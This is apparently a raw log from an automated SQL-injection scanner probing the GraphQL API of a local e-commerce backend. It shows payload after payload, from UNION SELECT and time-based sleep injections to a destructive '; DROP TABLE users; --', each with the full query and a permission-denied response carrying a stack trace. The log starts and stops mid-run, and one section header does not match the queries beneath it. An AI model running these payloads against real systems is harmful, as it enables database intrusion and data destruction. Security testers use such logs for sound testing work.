[+] Introspecting http://localhost:8000/graphql/

[>] Testing warehouse (string args: ['externalReference'])

[>] Testing warehouses (string args: ['before', 'after'])

	Payload:  '

	Payload: ' OR 'x'='x' /*
	Query: query { exportFiles(before: "' OR 'x'='x' /*", after: "' OR 'x'='x' /*") { totalCount } }
	Response: {"errors": [{"message": "To access this path, you need one of the following permissions: MANAGE_PRODUCTS", "locations": [{"line": 1, "column": 9}], "path": ["exportFiles"], "extensions": {"exception": {"code": "PermissionDenied", "stacktrace": ["Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 30, in wrapper", "    return func(info.context, *args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 44, in wrapper", "    test_func(context)", "  File \"/app/saleor/graphql/decorators.py\", line 85, in check_perms", "    raise PermissionDenied(permissions=perms)", "saleor.core.exceptions.PermissionDenied: To access this path, you need one of the following permissions: MANAGE_PRODUCTS"]}}}], "data": {"exportFiles": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' OR EXISTS(SELECT * FROM users)--
	Query: query { exportFiles(before: "' OR EXISTS(SELECT * FROM users)--", after: "' OR EXISTS(SELECT * FROM users)--") { totalCount } }
	Response: {"errors": [{"message": "To access this path, you need one of the following permissions: MANAGE_PRODUCTS", "locations": [{"line": 1, "column": 9}], "path": ["exportFiles"], "extensions": {"exception": {"code": "PermissionDenied", "stacktrace": ["Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 30, in wrapper", "    return func(info.context, *args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 44, in wrapper", "    test_func(context)", "  File \"/app/saleor/graphql/decorators.py\", line 85, in check_perms", "    raise PermissionDenied(permissions=perms)", "saleor.core.exceptions.PermissionDenied: To access this path, you need one of the following permissions: MANAGE_PRODUCTS"]}}}], "data": {"exportFiles": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
	Query: query { exportFiles(before: "' AND 1=(SELECT COUNT(*) FROM tablename)--", after: "' AND 1=(SELECT COUNT(*) FROM tablename)--") { totalCount } }
	Response: {"errors": [{"message": "To access this path, you need one of the following permissions: MANAGE_PRODUCTS", "locations": [{"line": 1, "column": 9}], "path": ["exportFiles"], "extensions": {"exception": {"code": "PermissionDenied", "stacktrace": ["Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 30, in wrapper", "    return func(info.context, *args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 44, in wrapper", "    test_func(context)", "  File \"/app/saleor/graphql/decorators.py\", line 85, in check_perms", "    raise PermissionDenied(permissions=perms)", "saleor.core.exceptions.PermissionDenied: To access this path, you need one of the following permissions: MANAGE_PRODUCTS"]}}}], "data": {"exportFiles": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

[>] Testing checkouts (string args: ['channel', 'before', 'after'])

	Payload:  '
	Query: query { checkouts(channel: " '", before: " '", after: " '") { totalCount } }
	Response: {"errors": [{"message": "To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS", "locations": [{"line": 1, "column": 9}], "path": ["checkouts"], "extensions": {"exception": {"code": "PermissionDenied", "stacktrace": ["Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 30, in wrapper", "    return func(info.context, *args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 44, in wrapper", "    test_func(context)", "  File \"/app/saleor/graphql/decorators.py\", line 85, in check_perms", "    raise PermissionDenied(permissions=perms)", "saleor.core.exceptions.PermissionDenied: To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS"]}}}], "data": {"checkouts": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' OR '1'='1
	Query: query { checkouts(channel: "' OR '1'='1", before: "' OR '1'='1", after: "' OR '1'='1") { totalCount } }
	Response: {"errors": [{"message": "To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS", "locations": [{"line": 1, "column": 9}], "path": ["checkouts"], "extensions": {"exception": {"code": "PermissionDenied", "stacktrace": ["Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 30, in wrapper", "    return func(info.context, *args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 44, in wrapper", "    test_func(context)", "  File \"/app/saleor/graphql/decorators.py\", line 85, in check_perms", "    raise PermissionDenied(permissions=perms)", "saleor.core.exceptions.PermissionDenied: To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS"]}}}], "data": {"checkouts": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' OR 1=1--
	Query: query { checkouts(channel: "' OR 1=1--", before: "' OR 1=1--", after: "' OR 1=1--") { totalCount } }
	Response: {"errors": [{"message": "To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS", "locations": [{"line": 1, "column": 9}], "path": ["checkouts"], "extensions": {"exception": {"code": "PermissionDenied", "stacktrace": ["Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 30, in wrapper", "    return func(info.context, *args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 44, in wrapper", "    test_func(context)", "  File \"/app/saleor/graphql/decorators.py\", line 85, in check_perms", "    raise PermissionDenied(permissions=perms)", "saleor.core.exceptions.PermissionDenied: To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS"]}}}], "data": {"checkouts": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' OR 'a'='a
	Query: query { checkouts(channel: "' OR 'a'='a", before: "' OR 'a'='a", after: "' OR 'a'='a") { totalCount } }
	Response: {"errors": [{"message": "To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS", "locations": [{"line": 1, "column": 9}], "path": ["checkouts"], "extensions": {"exception": {"code": "PermissionDenied", "stacktrace": ["Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 30, in wrapper", "    return func(info.context, *args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 44, in wrapper", "    test_func(context)", "  File \"/app/saleor/graphql/decorators.py\", line 85, in check_perms", "    raise PermissionDenied(permissions=perms)", "saleor.core.exceptions.PermissionDenied: To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS"]}}}], "data": {"checkouts": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' UNION SELECT NULL--
	Query: query { checkouts(channel: "' UNION SELECT NULL--", before: "' UNION SELECT NULL--", after: "' UNION SELECT NULL--") { totalCount } }
	Response: {"errors": [{"message": "To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS", "locations": [{"line": 1, "column": 9}], "path": ["checkouts"], "extensions": {"exception": {"code": "PermissionDenied", "stacktrace": ["Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 30, in wrapper", "    return func(info.context, *args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 44, in wrapper", "    test_func(context)", "  File \"/app/saleor/graphql/decorators.py\", line 85, in check_perms", "    raise PermissionDenied(permissions=perms)", "saleor.core.exceptions.PermissionDenied: To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS"]}}}], "data": {"checkouts": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: '; DROP TABLE users; --
	Query: query { checkouts(channel: "'; DROP TABLE users; --", before: "'; DROP TABLE users; --", after: "'; DROP TABLE users; --") { totalCount } }
	Response: {"errors": [{"message": "To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS", "locations": [{"line": 1, "column": 9}], "path": ["checkouts"], "extensions": {"exception": {"code": "PermissionDenied", "stacktrace": ["Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 30, in wrapper", "    return func(info.context, *args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 44, in wrapper", "    test_func(context)", "  File \"/app/saleor/graphql/decorators.py\", line 85, in check_perms", "    raise PermissionDenied(permissions=perms)", "saleor.core.exceptions.PermissionDenied: To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS"]}}}], "data": {"checkouts": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
	Query: query { checkouts(channel: "' AND 1=0 UNION SELECT NULL,NULL--", before: "' AND 1=0 UNION SELECT NULL,NULL--", after: "' AND 1=0 UNION SELECT NULL,NULL--") { totalCount } }
	Response: {"errors": [{"message": "To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS", "locations": [{"line": 1, "column": 9}], "path": ["checkouts"], "extensions": {"exception": {"code": "PermissionDenied", "stacktrace": ["Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 30, in wrapper", "    return func(info.context, *args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 44, in wrapper", "    test_func(context)", "  File \"/app/saleor/graphql/decorators.py\", line 85, in check_perms", "    raise PermissionDenied(permissions=perms)", "saleor.core.exceptions.PermissionDenied: To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS"]}}}], "data": {"checkouts": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ') OR ('1'='1
	Query: query { checkouts(channel: "') OR ('1'='1", before: "') OR ('1'='1", after: "') OR ('1'='1") { totalCount } }
	Response: {"errors": [{"message": "To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS", "locations": [{"line": 1, "column": 9}], "path": ["checkouts"], "extensions": {"exception": {"code": "PermissionDenied", "stacktrace": ["Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 30, in wrapper", "    return func(info.context, *args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 44, in wrapper", "    test_func(context)", "  File \"/app/saleor/graphql/decorators.py\", line 85, in check_perms", "    raise PermissionDenied(permissions=perms)", "saleor.core.exceptions.PermissionDenied: To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS"]}}}], "data": {"checkouts": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: admin' --
	Query: query { checkouts(channel: "admin' --", before: "admin' --", after: "admin' --") { totalCount } }
	Response: {"errors": [{"message": "To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS", "locations": [{"line": 1, "column": 9}], "path": ["checkouts"], "extensions": {"exception": {"code": "PermissionDenied", "stacktrace": ["Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 30, in wrapper", "    return func(info.context, *args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 44, in wrapper", "    test_func(context)", "  File \"/app/saleor/graphql/decorators.py\", line 85, in check_perms", "    raise PermissionDenied(permissions=perms)", "saleor.core.exceptions.PermissionDenied: To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS"]}}}], "data": {"checkouts": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' OR sleep(5)--
	Query: query { checkouts(channel: "' OR sleep(5)--", before: "' OR sleep(5)--", after: "' OR sleep(5)--") { totalCount } }
	Response: {"errors": [{"message": "To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS", "locations": [{"line": 1, "column": 9}], "path": ["checkouts"], "extensions": {"exception": {"code": "PermissionDenied", "stacktrace": ["Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 30, in wrapper", "    return func(info.context, *args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 44, in wrapper", "    test_func(context)", "  File \"/app/saleor/graphql/decorators.py\", line 85, in check_perms", "    raise PermissionDenied(permissions=perms)", "saleor.core.exceptions.PermissionDenied: To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS"]}}}], "data": {"checkouts": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' AND sleep(5)--
	Query: query { checkouts(channel: "' AND sleep(5)--", before: "' AND sleep(5)--", after: "' AND sleep(5)--") { totalCount } }
	Response: {"errors": [{"message": "To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS", "locations": [{"line": 1, "column": 9}], "path": ["checkouts"], "extensions": {"exception": {"code": "PermissionDenied", "stacktrace": ["Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 30, in wrapper", "    return func(info.context, *args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 44, in wrapper", "    test_func(context)", "  File \"/app/saleor/graphql/decorators.py\", line 85, in check_perms", "    raise PermissionDenied(permissions=perms)", "saleor.core.exceptions.PermissionDenied: To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS"]}}}], "data": {"checkouts": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' WAITFOR DELAY '0:0:5'--
	Query: query { checkouts(channel: "' WAITFOR DELAY '0:0:5'--", before: "' WAITFOR DELAY '0:0:5'--", after: "' WAITFOR DELAY '0:0:5'--") { totalCount } }
	Response: {"errors": [{"message": "To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS", "locations": [{"line": 1, "column": 9}], "path": ["checkouts"], "extensions": {"exception": {"code": "PermissionDenied", "stacktrace": ["Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 30, in wrapper", "    return func(info.context, *args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 44, in wrapper", "    test_func(context)", "  File \"/app/saleor/graphql/decorators.py\", line 85, in check_perms", "    raise PermissionDenied(permissions=perms)", "saleor.core.exceptions.PermissionDenied: To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS"]}}}], "data": {"checkouts": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' OR 'x'='x' /*
	Query: query { checkouts(channel: "' OR 'x'='x' /*", before: "' OR 'x'='x' /*", after: "' OR 'x'='x' /*") { totalCount } }
	Response: {"errors": [{"message": "To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS", "locations": [{"line": 1, "column": 9}], "path": ["checkouts"], "extensions": {"exception": {"code": "PermissionDenied", "stacktrace": ["Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 30, in wrapper", "    return func(info.context, *args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/decorators.py\", line 44, in wrapper", "    test_func(context)", "  File \"/app/saleor/graphql/decorators.py\", line 85, in check_perms", "    raise PermissionDenied(permissions=perms)", "saleor.core.exceptions.PermissionDenied: To access this path, you need one of the following permissions: MANAGE_CHECKOUTS, HANDLE_PAYMENTS"]}}}], "data": {"checkouts": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' OR EXISTS(SELECT * FROM users)--
	Query: query { checkouts(channel: "' OR EXISTS(SELECT * FROM users)--", before: "' OR EXISTS(SELECT * FROM users)--", after: "' OR EXISTS(SELECT * FROM users)--") { totalCount } }
